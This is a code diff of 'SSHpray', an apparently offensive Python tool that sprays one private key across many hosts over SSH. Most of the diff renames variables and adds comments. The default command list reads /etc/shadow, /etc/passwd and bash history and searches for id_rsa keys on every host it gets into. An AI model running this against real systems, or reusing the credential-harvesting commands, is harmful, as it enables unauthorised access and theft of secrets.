@@ -9,25 +9,38 @@ class SSHpray():
 	def __init__(self, args):
 
 		#defaults
-		self.private_keys = []
-		self.args = args
-		self.verbose = False
-		self.version ='beta.08012017'
+		#record start time
 		self.startTime = time.time()
-		self.reportDir = './reports/'
-		self.targetsFile = ''
-		self.targetList = []
-		self.targetSet = set()
-		self.domainResult = set()
-		self.userName = None
+		#pass in args. this is messy
+		self.args = args
+		#verbosity explicitly off
+		self.verbose = False
+		#version
+		self.version ='beta.08012017'
+		#default 5 second timeout for ssh
 		self.timeout = int(5)
-
+		#eventually we'll support >1 key
+		self.private_keys = []
+		#init target file 
+		self.targets_file = None
+		#targets from file go into the list
+		self.target_list = []
+		#target set is used for valid IPs
+		self.target_set = set()
+		#init username as none, default will apply current user if no -u
+		self.user_name = None
+		#record stdout from successful ssh command, will output later
+		self.ssh_result = []
+		#dump reports here
+		self.reportDir = './reports/'
 		#command(s) to run
 		self.remote_commands = ['sudo locate id_rsa', 'sudo ','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
 
-	def check_args(self, parser):
 
-		print(self.args)
+	def check_args(self, parser):
+		#print version and supplied args if verbose
+
+		if self.args.verbose is True: print('[i] Version: {}\n[i] You ran: {}'.format(self.version,sys.argv))
 
 		#require at least one argument
 		if not (self.args.targets or self.args.ipaddress):
@@ -38,15 +51,15 @@ class SSHpray():
 		#if a file is supplied and no ip is supplied, open it with read_targets
 		if self.args.targets is not None:
 			print('[i] Opening targets file: {}'.format(self.args.targets))
-			self.targetsFile = self.args.targets
+			self.targets_file = self.args.targets
 			self.read_targets()
 		else:
-			self.targetSet.add(''.join(self.args.ipaddress))
+			self.target_set.add(''.join(self.args.ipaddress))
 
 		if self.args.username is None:
-			self.userName = os.getlogin()
+			self.user_name = os.getlogin()
 		else:
-			self.userName = self.args.username
+			self.user_name = self.args.username
 
 		if self.args.commands is not None:
 			self.remote_commands=[]
@@ -61,16 +74,16 @@ class SSHpray():
 			targets = f.readlines()
 			#add to target list, strip stuff
 			for x in targets:
-				self.targetList.append(x.strip())
+				self.target_list.append(x.strip())
 		
-		#iterate through targetList
-		for i,t in enumerate(self.targetList):
+		#iterate through target_list
+		for i,t in enumerate(self.target_list):
 			#test to see if its a valid ip using socket
 			try:
 				#print(socket.inet_aton(str(t))) 
 				socket.inet_aton(t)
 				#add to set
-				self.targetSet.add(t)
+				self.target_set.add(t)
 			#if the ip isnt valid
 			except socket.error:
 				#tell them
@@ -86,15 +99,15 @@ class SSHpray():
 		if not ipAddrRegex.match(t):
 			#remove from targetList
 			if self.args.verbose is True:print('[v] Removing invalid IP {}'% t)
-			self.targetList.remove(t)
+			self.target_list.remove(t)
 		else:
 			#otherwise add to target set
-			self.targetSet.add(t)
+			self.target_set.add(t)
 		
 		#need to expand cidr and filter rfc1918, etc	
 		#show user target set of unique IPs
 		if self.args.verbose is True:print('[i] Reconciled target list:')
-		if self.args.verbose is True:print(', '.join(self.targetSet))
+		if self.args.verbose is True:print(', '.join(self.target_set))
 		print('[i] All targets are valid IP addresses')
 	
 	def fix_targets(self, t):
@@ -107,14 +120,14 @@ class SSHpray():
 			hostDomainCmd = subprocess.Popen(['dig', '+short', domain], stdout = PIPE)
 			#print('[i] IP address for {} found: {}'.format(t,hostDomainCmd.stdout.read().strip('\n')))
 			#for each line in the host commands output, add to a fixed target list
-			self.targetSet.add(hostDomainCmd.stdout.read().strip('\n')) 
+			self.target_set.add(hostDomainCmd.stdout.read().strip('\n')) 
 		
 		#filter hostnames
 		else:
 			if self.args.verbose is True:print('[i] Looking up IP for hostname {}'.format(t))
 			#just resolve ip from hostname if no http:// or https:// in the entry
 			hostNameCmd = subprocess.Popen(['dig', '+short', t], stdout = PIPE)
-			self.targetSet.add(hostNameCmd.stdout.read().strip('\n'))
+			self.target_set.add(hostNameCmd.stdout.read().strip('\n'))
 	
 	def signal_handler(self, signal, frame):
 		print('You pressed Ctrl+C! Exiting...')
@@ -129,7 +142,7 @@ class SSHpray():
 		with open(self.args.keyfile) as f:
 			private_key = f.readlines()
 		print('[i] Using Private Key: {} '.format(self.args.keyfile))
-		for i, t in enumerate(self.targetSet):
+		for i, t in enumerate(self.target_set):
 			if self.args.verbose is True: print ("[+] Attempting to SSH to {}".format(t) )
 			try:#Initialize SSH session to host via paramiko and run the command contents
 				ssh = paramiko.SSHClient()
